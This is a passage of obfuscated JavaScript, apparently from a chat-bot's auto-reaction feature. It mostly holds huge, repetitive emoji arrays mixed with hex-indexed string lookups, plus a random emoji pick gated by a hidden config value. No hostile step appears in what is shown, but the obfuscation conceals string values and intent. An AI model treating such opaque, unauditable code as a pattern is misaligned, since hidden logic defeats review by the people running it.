'\ud83e\udddb', _0x1ed978('\x30\x78\x31\x63\x31'), _0x1ed978('\x30\x78\x31\x37\x38'), '\ud83e\udddc', _0x1ed978(0x28b), '\ud83e\udddc\u200d\u2640\ufe0f', '\ud83e\udddd', '\ud83e\udddd\u200d\u2642\ufe0f', _0x1ed978(0x1f2), '\ud83e\uddde', _0x1ed978('\x30\x78\x31\x65\x38'), _0x1ed978('\x30\x78\x66\x35'), '\ud83e\udddf', _0x1ed978(0x123), _0x1ed978(0xf7), '\ud83d\udc86', '\ud83d\udc86\u200d\u2642\ufe0f', '\ud83d\udc86\u200d\u2640\ufe0f', '\ud83d\udc87', _0x1ed978('\x30\x78\x31\x64\x36'), _0x1ed978(0x25e), '\ud83d\udeb6', _0x1ed978(0x130), _0x1ed978('\x30\x78\x31\x34\x66'), '\ud83e\uddcd', _0x1ed978('\x30\x78\x32\x34\x37'), _0x1ed978('\x30\x78\x31\x31\x62'), '\ud83e\uddce', _0x1ed978('\x30\x78\x32\x32\x61'), _0x1ed978(0xe5), '\ud83e\uddd1\u200d\ud83e\uddaf', _0x1ed978('\x30\x78\x31\x33\x61'), _0x1ed978(0x169), '\ud83e\uddd1\u200d\ud83e\uddbc', _0x1ed978(0x147), _0x1ed978(0x234), _0x1ed978('\x30\x78\x31\x62\x37'), '\ud83d\udc68\u200d\ud83e\uddbd', _0x1ed978(0x263), '\ud83c\udfc3', _0x1ed978(0x1f7), _0x1ed978(0x1fe), '\ud83d\udc83', '\ud83d\udd7a', _0x1ed978(0x16d), '\ud83d\udc6f', _0x1ed978(0x106), _0x1ed978('\x30\x78\x32\x37\x37'), '\ud83e\uddd6', _0x1ed978('\x30\x78\x32\x33\x66'), '\ud83e\uddd6\u200d\u2640\ufe0f', '\ud83e\uddd7', _0x1ed978(0x275), _0x1ed978(0x20b), '\ud83e\udd3a', '\ud83c\udfc7', '\u26f7\ufe0f', '\ud83c\udfc2', _0x1ed978(0xff), _0x1ed978('\x30\x78\x32\x37\x36'), _0x1ed978(0x296), '\ud83c\udfc4', _0x1ed978(0x11a), _0x1ed978(0x222), '\ud83d\udea3', '\ud83d\udea3\u200d\u2642\ufe0f', _0x1ed978('\x30\x78\x31\x39\x35'), '\ud83c\udfca', _0x1ed978(0x264), '\ud83c\udfca\u200d\u2640\ufe0f', '\u26f9\ufe0f', _0x1ed978(0xf4), _0x1ed978(0x274), '\ud83c\udfcb\ufe0f', _0x1ed978('\x30\x78\x32\x39\x34'), '\ud83c\udfcb\ufe0f\u200d\u2640\ufe0f', '\ud83d\udeb4', _0x1ed978('\x30\x78\x31\x62\x65'), _0x1ed978('\x30\x78\x32\x37\x65'), '\ud83d\udeb5', _0x1ed978('\x30\x78\x31\x32\x39'), '\ud83d\udeb5\u200d\u2640\ufe0f', '\ud83e\udd38', _0x1ed978(0x233), _0x1ed978('\x30\x78\x31\x39\x61'), '\ud83e\udd3c', _0x1ed978(0x203), _0x1ed978('\x30\x78\x32\x32\x31'), '\ud83e\udd3d', _0x1ed978(0x219), _0x1ed978('\x30\x78\x31\x64\x66'), '\ud83e\udd3e', '\ud83e\udd3e\u200d\u2642\ufe0f', _0x1ed978('\x30\x78\x32\x31\x34'), '\ud83e\udd39', _0x1ed978('\x30\x78\x31\x62\x30'), _0x1ed978(0x199), '\ud83e\uddd8', _0x1ed978('\x30\x78\x31\x63\x36'), _0x1ed978(0x242), '\ud83d\udec0', '\ud83d\udecc', _0x1ed978('\x30\x78\x31\x39\x34'), '\ud83d\udc6d', '\ud83d\udc6b', '\ud83d\udc6c', '\ud83d\udc8f', '\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68', _0x1ed978(0x1f6), _0x1ed978('\x30\x78\x31\x63\x30'), '\ud83d\udc91', '\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc68', _0x1ed978('\x30\x78\x32\x32\x39'), _0x1ed978('\x30\x78\x31\x38\x65'), '\ud83d\udc6a', _0x1ed978('\x30\x78\x32\x37\x38'), _0x1ed978(0xf8), _0x1ed978(0x191), _0x1ed978(0x218), _0x1ed978('\x30\x78\x32\x33\x38'), '\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66', _0x1ed978('\x30\x78\x31\x63\x38'), _0x1ed978('\x30\x78\x32\x32\x34'), '\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66', _0x1ed978('\x30\x78\x31\x33\x62'), _0x1ed978('\x30\x78\x32\x38\x65'), _0x1ed978(0x254), _0x1ed978(0x113), '\ud83d\udc69\u200d\ud83d\udc69\u200d\ud83d\udc66\u200d\ud83d\udc66', _0x1ed978('\x30\x78\x32\x34\x38'), _0x1ed978(0x144), '\ud83d\udc68\u200d\ud83d\udc66\u200d\ud83d\udc66', _0x1ed978(0x11e), '\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc66', '\ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc67', _0x1ed978('\x30\x78\x31\x34\x65'), _0x1ed978(0x210), _0x1ed978('\x30\x78\x31\x39\x37'), _0x1ed978('\x30\x78\x32\x38\x64'), '\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67', _0x1ed978(0x21f), '\ud83d\udc64', '\ud83d\udc65', '\ud83e\udec2', '\ud83d\udc63', '\ud83e\uddb0', '\ud83e\uddb1', '\ud83e\uddb3', '\ud83e\uddb2', '\ud83d\udc35'],
                    _0x25a8b7 = _0x551370[Math[_0x1ed978(0x1cb)](Math[_0x1ed978('\x30\x78\x32\x30\x38')]() * _0x551370[_0x1ed978('\x30\x78\x31\x63\x35')])];
                _0xa7df8d[_0x1ed978('\x30\x78\x31\x39\x32')](_0x25a8b7);
            }
        }
        if (!_0x457ee3 && _0x4a39ba === _0xb16346) {
            if (config[_0x1ed978(0xe0)] === _0x1ed978('\x30\x78\x32\x33\x63')) {
                const _0x54fe6a = ['\ud83d\ude0a', '\ud83d\udc4d', '\ud83d\ude02', '\ud83d\udcaf', '\ud83d\udd25', '\ud83d\ude4f', '\ud83c\udf89', '\ud83d\udc4f', '\ud83d\ude0e', '\ud83e\udd16', '\ud83d\udc6b', '\ud83d\udc6d', '\ud83d\udc6c', '\ud83d\udc6e', _0x1ed978(0x16d), '\ud83d\udcbc', '\ud83d\udcca', '\ud83d\udcc8', '\ud83d\udcc9', '\ud83d\udcca', '\ud83d\udcdd', '\ud83d\udcda', '\ud83d\udcf0', '\ud83d\udcf1', '\ud83d\udcbb', '\ud83d\udcfb', '\ud83d\udcfa', '\ud83c\udfac', _0x1ed978(0x239), '\ud83d\udcf8', '\ud83d\udcf7', _0x1ed978(0x127), '\ud83d\udca1', '\ud83d\udd26', '\ud83d\udd27', '\ud83d\udd28', '\ud83d\udd29', '\ud83d\udd2a', '\ud83d\udd2b', '\ud83d\udc51', '\ud83d\udc78', '\ud83e\udd34', '\ud83d\udc79', '\ud83e\udd3a', '\ud83e\udd3b', '\ud83d\udc7a', '\ud83e\udd3c', '\ud83e\udd3d', '\ud83e\udd3e', '\ud83e\udd3f', '\ud83e\udd81', '\ud83d\udc34', '\ud83e\udd8a', '\ud83d\udc3a', '\ud83d\udc3c', '\ud83d\udc3e', '\ud83d\udc3f', '\ud83e\udd84', '\ud83e\udd85', '\ud83e\udd86', '\ud83e\udd87', '\ud83e\udd88', '\ud83d\udc33', '\ud83d\udc0b', '\ud83d\udc1f', '\ud83d\udc20', '\ud83d\udc21', '\ud83d\udc19', '\ud83d\udc1a', '\ud83d\udc1c', '\ud83d\udc1d', '\ud83d\udc1e', _0x1ed978('\x30\x78\x65\x65'), '\ud83e\udd8b', '\ud83d\udc1b', '\ud83d\udc0c', '\ud83d\udc1a', '\ud83c\udf3f', '\ud83c\udf38', '\ud83d\udc90', '\ud83c\udf39', '\ud83c\udf3a', '\ud83c\udf3b', '\ud83c\udf34', '\ud83c\udff5', '\ud83c\udff0', '\ud83c\udfe0', '\ud83c\udfe1', '\ud83c\udfe2', '\ud83c\udfe3', '\ud83c\udfe5', '\ud83c\udfe6', '\ud83c\udfe7', '\ud83c\udfe8', '\ud83c\udfe9', '\ud83c\udfea', '\ud83c\udfeb', '\ud83c\udfec', '\ud83c\udfed', '\ud83c\udfee', '\ud83c\udfef', '\ud83d\udea3', '\ud83d\udee5', '\ud83d\ude82', '\ud83d\ude81', '\ud83d\ude80', '\ud83d\udef8', '\ud83d\udef9', '\ud83d\udeb4', '\ud83d\udeb2', '\ud83d\udefa', '\ud83d\udeae', '\ud83d\udeaf', '\ud83d\udeb1', '\ud83d\udeab', '\ud83d\udebd', _0x1ed978(0xe3), '\ud83d\udca3', '\ud83d\udd2b', _0x1ed978(0xee), _0x1ed978(0x286), '\ud83d\udc80', '\ud83d\udc7b', '\ud83d\udd7a', '\ud83d\udc83', _0x1ed978(0x16d), '\ud83d\udc76', '\ud83d\udc75', '\ud83d\udc74', '\ud83d\udc71', '\ud83d\udc68', '\ud83d\udc69', '\ud83d\udc67', '\ud83d\udc66', '\ud83d\udc6a', '\ud83d\udc6b', '\ud83d\udc6d', '\ud83d\udc6c', '\ud83d\udc6e', _0x1ed978('\x30\x78\x31\x36\x64'), '\ud83d\udcbc', '\ud83d\udcca', '\ud83d\udcc8', '\ud83d\udcc9', '\ud83d\udcca', '\ud83d\udcdd', '\ud83d\udcda', '\ud83d\udcf0', '\ud83d\udcf1', '\ud83d\udcbb', '\ud83d\udcfb', '\ud83d\udcfa', '\ud83c\udfac', _0x1ed978('\x30\x78\x32\x33\x39'), '\ud83d\udcf8', '\ud83d\udcf7', _0x1ed978('\x30\x78\x31\x32\x37'), '\ud83d\udca1', '\ud83d\udd26', '\ud83d\udd27', '\ud83d\udd28', '\ud83d\udd29', '\ud83d\udd2a', '\ud83d\udd2b', '\ud83d\udc51', '\ud83d\udc78', '\ud83e\udd34', '\ud83d\udc79', '\ud83e\udd3a', '\ud83e\udd3b', '\ud83d\udc7a', '\ud83e\udd3c', '\ud83e\udd3d', '\ud83e\udd3e', '\ud83e\udd3f', '\ud83e\udd81', '\ud83d\udc34', '\ud83e\udd8a', '\ud83d\udc3a', '\ud83d\udc3c', '\ud83d\udc3e', '\ud83d\udc3f', '\ud83e\udd84', '\ud83e\udd85', '\ud83e\udd86', '\ud83e\udd87', '\ud83e\udd88', '\ud83d\udc33', '\ud83d\udc0b', '\ud83d\udc1f', '\ud83d\udc20', '\ud83d\udc21', '\ud83d\udc19', '\ud83d\udc1a', '\ud83d\udc1c', '\ud83d\udc1d', '\ud83d\udc1e', _0x1ed978('\x30\x78\x65\x65'), '\ud83e\udd8b', '\ud83d\udc1b', '\ud83d\udc0c', '\ud83d\udc1a', '\ud83c\udf3f', '\ud83c\udf38', '\ud83d\udc90', '\ud83c\udf39', '\ud83c\udf3a', '\ud83c\udf3b', '\ud83c\udf34', '\ud83c\udff5', '\ud83c\udff0', '\ud83c\udfe0', '\ud83c\udfe1', '\ud83c\udfe2', '\ud83c\udfe0', '\ud83c\udfe1', '\ud83c\udfe2', '\ud83c\udfe3', '\ud83c\udfe5', '\ud83c\udfe6', '\ud83c\udfe7', '\ud83c\udfe8', '\ud83c\udfe9', '\ud83c\udfea', '\ud83c\udfeb', '\ud83c\udfec', '\ud83c\udfed', '\ud83c\udfee', '\ud83c\udfef', '\ud83d\udea3', '\ud83d\udee5', '\ud83d\ude82', '\ud83d\ude81', '\ud83d\ude80', '\ud83d\udef8', '\ud83d\udef9', '\ud83d\udeb4', '\ud83d\udeb2', '\ud83d\udefa', '\ud83d\udeae', '\ud83d\udeaf', '\ud83d\udeb1', '\ud83d\udeab', '\ud83d\udebd', _0x1ed978('\x30\x78\x65\x33'), '\ud83d\udca3', '\ud83d\udd2b', '\ud83d\udd77\ufe0f', _0x1ed978(0x286), '\ud83d\udc80', '\ud83d\udc7b', '\ud83d\udd7a', '\ud83d\udc83', '\ud83d\udd74\ufe0f', '\ud83d\udc76', '\ud83d\udc75', '\ud83d\udc74', '\ud83d\udc71', '\ud83d\udc68', '\ud83d\udc69', '\ud83d\udc67', '\ud83d\udc66', '\ud83d\udc6a', '\ud83d\udc6b', '\ud83d\udc6d', '\ud83d\udc6c', '\ud83d\udc6e', '\ud83d\udd74\ufe0f', '\ud83d\udcbc', '\ud83d\udcca', '\ud83d\udcc8', '\ud83d\udcc9', '\ud83d\udcca', '\ud83d\udcdd', '\ud83d\udcda', '\ud83d\udcf0', '\ud83d\udcf1', '\ud83d\udcbb', '\ud83d\udcfb', '\ud83d\udcfa', '\ud83c\udfac', _0x1ed978('\x30\x78\x32\x33\x39'), '\ud83d\udcf8', '\ud83d\udcf7', _0x1ed978('\x30\x78\x31\x32\x37'), '\ud83d\udca1', '\ud83d\udd26', '\ud83d\udd27', '\ud83d\udd28', '\ud83d\udd29', '\ud83d\udd2a', '\ud83d\udd2b', '\ud83d\udc51', '\ud83d\udc78', '\ud83e\udd34', '\ud83d\udc79', '\ud83e\udd3a', '\ud83e\udd3b', '\ud83d\udc7a', '\ud83e\udd3c', '\ud83e\udd3d', '\ud83e\udd3e', '\ud83e\udd3f', '\ud83e\udd81', '\ud83d\udc34', '\ud83e\udd8a', '\ud83d\udc3a', '\ud83d\udc3c', '\ud83d\udc3e', '\ud83d\udc3f', '\ud83e\udd84', '\ud83e\udd85', '\ud83e\udd86', '\ud83e\udd87', '\ud83e\udd88', '\ud83d\udc33', '\ud83d\udc0b', '\ud83d\udc1f', '\ud83d\udc20', '\ud83d\udc21', '\ud83d\udc19', '\ud83d\udc1a', '\ud83d\udc1c', '\ud83d\udc1d', '\ud83d\udc1e', _0x1ed978('\x30\x78\x65\x65'), '\ud83e\udd8b', '\ud83d\udc1b', '\ud83d\udc0c', '\ud83d\udc1a', '\ud83c\udf3f', '\ud83c\udf38', '\ud83d\udc90', '\ud83c\udf39', '\ud83c\udf3a', '\ud83c\udf3b', '\ud83c\udf34', '\ud83c\udff5', '\ud83c\udff0', '\ud83c\udfe0', '\ud83c\udfe1', '\ud83c\udfe2', '\ud83c\udfe3', '\ud83c\udfe5', '\ud83c\udfe6', '\ud83c\udfe7', '\ud83c\udfe8', '\ud83c\udfe9', '\ud83c\udfea', '\ud83c\udfeb', '\ud83c\udfec', '\ud83c\udfed', '\ud83c\udfee', '\ud83c\udfef', '\ud83d\udea3', '\ud83d\udee5', '\ud83d\ude82', '\ud83d\ude81', '\ud83d\ude80', '\ud83d\udef8', '\ud83d\udef9', '\ud83d\udeb4', '\ud83d\udeb2', '\ud83d\udefa', '\ud83d\udeae', '\ud83d\udeaf', '\ud83d\udeb1', '\ud83d\udeab', '\ud83d\udebd', _0x1ed978(0xe3), '\ud83d\udca3', '\ud83d\udd2b', _0x1ed978(0xee), _0x1ed978('\x30\x78\x32\x38\x36'), '\ud83d\udc80', '\ud83d\udc7b', '\ud83d\udd7a', '\ud83d\udc83', '\ud83d\udd74\ufe0f', '\ud83d\udc76', '\ud83d\udc75', '\ud83d\udc74', '\ud83d\udc71', '\ud83d\udc68', '\ud83d\udc69', '\ud83d\udc67', '\ud83d\udc66', '\ud83d\udc6a', '\ud83d\ude42', '\ud83d\ude11', '\ud83e\udd23', '\ud83d\ude0d', '\ud83d\ude18', '\ud83d\ude17', '\ud83d\ude19', '\ud83d\ude1a', '\ud83d\ude1b', '\ud83d\ude1d', '\ud83d\ude1e', '\ud83d\ude1f', '\ud83d\ude20', '\ud83d\ude21', '\ud83d\ude22', '\ud83d\ude2d', '\ud83d\ude13', '\ud83d\ude33', '\ud83d\ude34', '\ud83d\ude0c', '\ud83d\ude06', '\ud83d\ude02', '\ud83e\udd14', '\ud83d\ude12', '\ud83d\ude13', '\ud83d\ude36', '\ud83d\ude44', '\ud83d\udc36', '\ud83d\udc31', '\ud83d\udc14', '\ud83d\udc37', '\ud83d\udc34', '\ud83d\udc32', '\ud83d\udc38', '\ud83d\udc33', '\ud83d\udc0b', '\ud83d\udc12', '\ud83d\udc11', '\ud83d\udc15', '\ud83d\udc29', '\ud83c\udf54', '\ud83c\udf55', '\ud83e\udd64', '\ud83c\udf63', '\ud83c\udf72', '\ud83c\udf74', '\ud83c\udf7d', '\ud83c\udf79', '\ud83c\udf78', '\ud83c\udf82', '\ud83d\udcf1', '\ud83d\udcfa', '\ud83d\udcfb', '\ud83c\udfa4', '\ud83d\udcda', '\ud83d\udcbb', '\ud83d\udcf8', '\ud83d\udcf7', '\u2764\ufe0f', '\ud83d\udc94', '\u2763\ufe0f', '\u2600\ufe0f', '\ud83c\udf19', '\ud83c\udf03', '\ud83c\udfe0', '\ud83d\udeaa', _0x1ed978('\x30\x78\x65\x31'), _0x1ed978('\x30\x78\x31\x30\x66'), _0x1ed978('\x30\x78\x32\x38\x66'), _0x1ed978(0x14c), '\ud83c\uddef\ud83c\uddf5', _0x1ed978(0x170), _0x1ed978('\x30\x78\x31\x32\x62'), '\ud83d\udc4d', '\ud83d\udc4e', '\ud83d\udc4f', '\ud83d\udc6b', '\ud83d\udc6d', '\ud83d\udc6c', '\ud83d\udc6e', '\ud83e\udd1d', '\ud83d\ude4f', '\ud83d\udc51', '\ud83c\udf3b', '\ud83c\udf3a', '\ud83c\udf38', '\ud83c\udf39', '\ud83c\udf34', _0x1ed978('\x30\x78\x31\x64\x38'), '\ud83c\udf0a', '\ud83d\ude97', '\ud83d\ude8c', _0x1ed978('\x30\x78\x32\x36\x35'), _0x1ed978(0x25c), _0x1ed978(0x10b), '\ud83d\udea3', '\ud83d\udee5', '\ud83d\ude82', '\ud83d\ude81', '\ud83d\ude80', _0x1ed978('\x30\x78\x31\x66\x37'), _0x1ed978('\x30\x78\x31\x34\x36'), _0x1ed978(0x264), _0x1ed978('\x30\x78\x31\x31\x61'), '\ud83c\udfbe', '\ud83c\udfc0', '\ud83c\udfc8', '\ud83c\udfaf', '\ud83c\udfc6', '\x3f\x3f', '\u2b06\ufe0f', '\u2b07\ufe0f', '\u21d2', '\u21d0', '\u21a9\ufe0f', '\u21aa\ufe0f', '\u2139\ufe0f', '\u203c\ufe0f', '\u2049\ufe0f', '\u203d\ufe0f', '\u00a9\ufe0f', '\u00ae\ufe0f', '\u2122\ufe0f', '\ud83d\udd34', '\ud83d\udd35', '\ud83d\udfe2', '\ud83d\udd39', '\ud83d\udd3a', '\ud83d\udcaf', '\ud83d\udc51', '\ud83e\udd23', _0x1ed978('\x30\x78\x32\x35\x35'), _0x1ed978(0x1f0), _0x1ed978(0x295), _0x1ed978(0x13d), '\ud83d\ude46\u200d\u2642\ufe0f', _0x1ed978(0x273), _0x1ed978(0x190), _0x1ed978(0x1ce), '\ud83c\udffb', _0x1ed978('\x30\x78\x31\x30\x65'), _0x1ed978(0x1f5), _0x1ed978('\x30\x78\x32\x34\x39'), _0x1ed978(0x19c), _0x1ed978(0x1d6), _0x1ed978('\x30\x78\x32\x35\x65'), '\ud83d\udeab', '\ud83d\udebd', _0x1ed978(0xe3), '\ud83d\udca3', '\ud83d\udd2b', _0x1ed978('\x30\x78\x65\x65'), _0x1ed978(0x286), '\ud83d\udc80', '\ud83d\udc7b', '\ud83d\udd7a', '\ud83d\udc83', _0x1ed978('\x30\x78\x31\x36\x64'), '\ud83d\udc76', '\ud83d\udc75', '\ud83d\udc74', '\ud83d\udc71', '\ud83d\udc68', '\ud83d\udc69', '\ud83d\udc67', '\ud83d\udc66', '\ud83d\udc6a', '\ud83d\udc6b', '\ud83d\udc6d', '\ud83d\udc6c', '\ud83d\udc6e', _0x1ed978('\x30\x78\x31\x36\x64'), '\ud83d\udcbc', '\ud83d\udcca', '\ud83d\udcc8', '\ud83d\udcc9', '\ud83d\udcca', '\ud83d\udcdd', '\ud83d\udcda', '\ud83d\udcf0', '\ud83d\udcf1', '\ud83d\udcbb', '\ud83d\udcfb', '\ud83d\udcfa', '\ud83c\udfac', _0x1ed978(0x239), '\ud83d\udcf8', '\ud83d\udcf7', _0x1ed978(0x127), '\ud83d\udca1', '\ud83d\udd26', '\ufffd', '\ud83c\udfef', '\ud83c\udff0', '\ud83c\udfe0', '\ud83c\udfe1', '\ud83c\udfe2', '\ud83c\udfe3', '\ud83c\udfe5', '\ud83c\udfe6', '\ud83c\udfe7', '\ud83c\udfe8', '\ud83c\udfe9', '\ud83c\udfea', '\ud83c\udfeb', '\ud83c\udfec', '\ud83c\udfed', '\ud83c\udfee', '\ud83c\udfef', '\ud83d\udea3', '\ud83d\udee5', '\ud83d\ude82', '\ud83d\ude81', '\ud83d\ude80', '\ud83d\udef8', '\ud83d\udef9', '\ud83d\udeb4', '\ud83d\udeb2', '\ud83d\udefa', '\ud83d\udeae', '\ud83d\udeaf', '\ud83d\udeb1', '\ud83d\udeab', '\ud83d\udebd', _0x1ed978('\x30\x78\x65\x33'), '\ud83d\udca3', '\ud83d\udd2b', _0x1ed978('\x30\x78\x65\x65'), _0x1ed978('\x30\x78\x32\x38\x36'), '\ud83d\udc80', '\ud83d\udc7b', '\ud83d\udd7a', '\ud83d\udc83', _0x1ed978(0x16d), '\ud83d\udc76', '\ud83d\udc75', '\ud83d\udc74', '\ud83d\udc71', '\ud83d\udc68', '\ud83d\udc69', '\ud83d\udc67', '\ud83d\udc66', '\ud83d\udc6a', '\ud83d\udc6b', '\ud83d\udc6d', '\ud83d\udc6c', '\ud83d\udc6e', _0x1ed978('\x30\x78\x31\x36\x64'), '\ud83d\udcbc', '\ud83d\udcca', '\ud83d\udcc8', '\ud83d\udcc9', '\ud83d\udcca', '\ud83d\udcdd', '\ud83d\udcda', '\ud83d\udcf0', '\ud83d\udcf1', '\ud83d\udcbb', '\ud83d\udcfb', '\ud83d\udcfa', '\ud83c\udfac', _0x1ed978(0x239), '\ud83d\udcf8', '\ud83d\udcf7', _0x1ed978(0x127), '\ud83d\udca1', '\ud83d\udd26', '\ud83d\udd27', '\ud83d\udd28', '\ud83d\udd29', '\ud83d\udd2a', '\ud83d\udd2b', '\ud83d\udc51', '\ud83d\udc51', '\ud83d\udc78', '\ud83e\udd34', '\ud83d\udc79', '\ud83e\udd3a', '\ud83e\udd3b', '\ud83d\udc7a', '\ud83e\udd3c', '\ud83e\udd3d', '\ud83e\udd3e', '\ud83e\udd3f', '\ud83e\udd81', '\ud83d\udc34', '\ud83e\udd8a', '\ud83d\udc3a', '\ud83d\udc3c', '\ud83d\udc3e', '\ud83d\udc3f', '\ud83e\udd84', '\ud83e\udd85', '\ud83e\udd86', '\ud83e\udd87', '\ud83e\udd88', '\ud83d\udc33', '\ud83d\udc0b', '\ud83d\udc1f', '\ud83d\udc20', '\ud83d\udc21', '\ud83d\udc19', '\ud83d\udc1a', '\ud83d\udc1c', '\ud83d\udc1d', '\ud83d\udc1e', _0x1ed978('\x30\x78\x65\x65'), '\ud83e\udd8b', '\ud83d\udc1b', '\ud83d\udc0c', '\ud83d\udc1a', '\ud83c\udf3f', '\ud83c\udf38', '\ud83d\udc90', '\ud83c\udf39', '\ud83c\udf3a', '\ud83c\udf3b', '\ud83c\udf34', '\ud83c\udf33', '\ud83c\udf32', '\ud83c\udf3e', '\ud83c\udf3f', '\ud83c\udf43', '\ud83c\udf42', '\ud83c\udf43', '\ud83c\udf3b', '\ud83d\udc90', '\ud83c\udf39', '\ud83c\udf3a', '\ud83c\udf38', '\ud83c\udf34', '\ud83c\udff5', '\ud83c\udf80', '\ud83c\udfc6', '\ud83c\udfc8', '\ud83c\udfc9', '\ud83c\udfaf', '\ud83c\udfc0', '\ud83c\udfca', '\ud83c\udfcb', '\ud83c\udfcc', '\ud83c\udfb2', '\ud83d\udcda', '\ud83d\udcd6', '\ud83d\udcdc', '\ud83d\udcdd', '\ud83d\udcad', '\ud83d\udcac', '\ud83d\udde3', '\ud83d\udcab', '\ud83c\udf1f', '\ud83c\udf20', '\ud83c\udf89', '\ud83c\udf8a', '\ud83d\udc4f', '\ud83d\udca5', '\ud83d\udd25', '\ud83d\udca5', '\ud83c\udf2a', '\ud83d\udca8', '\ud83c\udf2b', '\ud83c\udf2c', '\ud83c\udf29', '\ud83c\udf28', '\ud83c\udf27', '\ud83c\udf26', '\ud83c\udf25', '\ud83c\udf21', '\ud83c\udf2a', '\ud83c\udf2b', '\ud83c\udf2c', '\ud83c\udf29', '\ud83c\udf28', '\ud83c\udf27', '\ud83c\udf26', '\ud83c\udf25', '\ud83c\udf21', '\ud83c\udf2a', '\ud83c\udf2b', '\ud83c\udf2c', '\ud83c\udf29', '\ud83c\udf28', '\ud83c\udf27', '\ud83c\udf26', '\ud83c\udf25', '\ud83c\udf21', '\ud83c\udf31', '\ud83c\udf3f', '\ud83c\udf43', '\ud83c\udf42', '\ud83c\udf3b', '\ud83d\udc90', '\ud83c\udf39', '\ud83c\udf3a', '\ud83c\udf38', '\ud83c\udf34', '\ud83c\udff5', '\ud83c\udf80', '\ud83c\udfc6', '\ud83c\udfc8', '\ud83c\udfc9', '\ud83c\udfaf', '\ud83c\udfc0', '\ud83c\udfca', '\ud83c\udfcb', '\ud83c\udfcc', '\ud83c\udfb2', '\ud83d\udcda', '\ud83d\udcd6', '\ud83d\udcdc', '\ud83d\udcdd', '\ud83d\udcad', '\ud83d\udcac', '\ud83d\udde3', '\ud83d\udcab', '\ud83c\udf1f', '\ud83c\udf20', '\ud83c\udf89', '\ud83c\udf8a', '\ud83d\udc4f', '\ud83d\udca5', '\ud83d\udd25', '\ud83d\udca5', '\ud83c\udf2a', '\ud83d\udca8', '\ud83c\udf2b', '\ud83c\udf2c', '\ud83c\udf29', '\ud83c\udf28', '\ud83c\udf27', '\ud83c\udf26', '\ud83c\udf25', '\ud83c\udf21', '\ud83c\udf2a', '\ud83c\udf2b', '\ud83c\udf2c', '\ud83c\udf29', '\ud83c\udf28', '\ud83c\udf27', '\ud83c\udf26', '\ud83c\udf25', '\ud83c\udf21', _0x1ed978(0x127), '\ud83d\udca1', '\ud83d\udd26', '\ud83d\udd27', '\ud83d\udd28', '\ud83d\udd29', '\ud83d\udd2a', '\ud83d\udd2b', '\ud83d\udc51', '\ud83d\udc78', '\ud83e\udd34', '\ud83d\udc79', '\ud83e\udd3a', '\ud83e\udd3b', '\ud83d\udc7a', '\ud83e\udd3c', '\ud83e\udd3d', '\ud83e\udd3e', '\ud83e\udd3f', '\ud83e\udd81', '\ud83d\udc34', '\ud83e\udd8a', '\ud83d\udc3a', '\ud83d\udc3c', '\ud83d\udc3e', '\ud83d\udc3f', '\ud83e\udd84', '\ud83e\udd85', '\ud83e\udd86', '\ud83e\udd87', '\ud83e\udd88', '\ud83d\udc33', '\ud83d\udc0b', '\ud83d\udc1f', '\ud83d\udc20', '\ud83d\udc21', '\ud83d\udc19', '\ud83d\udc1a', '\ud83d\udc1c', '\ud83d\udc1d', '\ud83d\udc1e', _0x1ed978(0xee), '\ud83e\udd8b', '\ud83d\udc1b', '\ud83d\udc0c', '\ud83d\udc1a', '\ud83c\udf3f', '\ud83c\udf38', '\ud83d\udc90', '\ud83c\udf39', '\ud83c\udf3a', '\ud83c\udf3b', '\ud83c\udf34', '\ud83c\udff5', '\ud83c\udff0', '\ud83c\udfe0', '\ud83c\udfe1', '\ud83c\udfe2', '\ud83c\udfe3', '\ud83c\udfe5', '\ud83c\udfe6', '\ud83c\udfe7', '\ud83c\udfe8', '\ud83c\udfe9', '\ud83c\udfea', '\ud83c\udfeb', '\ud83c\udfec', '\ud83c\udfed', '\ud83c\udfee', '\ud83c\udfef', '\ud83d\udea3', '\ud83d\udee5', '\ud83d\ude82', '\ud83d\ude81', '\ud83d\ude80', '\ud83d\udef8', '\ud83d\udef9', '\ud83d\udeb4', '\ud83d\udeb2', '\ud83d\udefa', '\ud83d\udeae', '\ud83d\udeaf', '\ud83d\udeb1', '\ud83d\udeab', '\ud83d\udebd', '\ud83d\udd73\ufe0f', '\ud83d\udca3', '\ud83d\udd2b', '\ud83d\udd77\ufe0f', _0x1ed978('\x30\x78\x32\x38\x36'), '\ud83d\udc80', '\ud83d\udc7b', '\ud83d\udd7a', '\ud83d\udc83', _0x1ed978(0x16d), '\ud83d\udc76', '\ud83d\udc75', '\ud83d\udc74', '\ud83d\udc71', '\ud83d\udc68', '\ud83d\udc69', '\ud83d\udc67', '\ud83d\udc66', '\ud83d\udc6a', '\ud83d\udc6b', '\ud83d\udc6d', '\ud83d\udc6c', '\ud83d\udc6e', _0x1ed978('\x30\x78\x31\x36\x64'), '\ud83d\udcbc', '\ud83d\udcca', '\ud83d\udcc8', '\ud83d\udcc9', '\ud83d\udcca', '\ud83d\udcdd', '\ud83d\udcda', '\ud83d\udcf0', '\ud83d\udcf1', '\ud83d\udcbb', '\ud83d\udcfb', '\ud83d\udcfa', '\ud83c\udfac', _0x1ed978('\x30\x78\x32\x33\x39'), '\ud83d\udcf8', '\ud83d\udcf7', '\ud83d\udd6f\ufe0f', '\ud83d\udca1', '\ud83d\udd26', '\ud83d\udd27', '\ud83d\udd28', '\ud83d\udd29', '\ud83d\udd2a', '\ud83d\udd2b', '\ud83d\udc51', '\ud83d\udc78', '\ud83e\udd34', '\ud83d\udc79', '\ud83e\udd3a', '\ud83e\udd3b', '\ud83d\udc7a', '\ud83e\udd3c', '\ud83e\udd3d', '\ud83e\udd3e', '\ud83e\udd3f', '\ud83e\udd81', '\ud83d\udc34', '\ud83e\udd8a', '\ud83d\udc3a', '\ud83d\udc3c', '\ud83d\udc3e', '\ud83d\udc3f', '\ud83e\udd84', '\ud83e\udd85', '\ud83e\udd86', '\ud83e\udd87', '\ud83e\udd88', '\ud83d\udc33', '\ud83d\udc0b', '\ud83d\udc1f', '\ud83d\udc20', '\ud83d\udc21', '\ud83d\udc19', '\ud83d\udc1a', '\ud83d\udc1c', '\ud83d\udc1d', '\ud83d\udc1e', _0x1ed978('\x30\x78\x65\x65'), 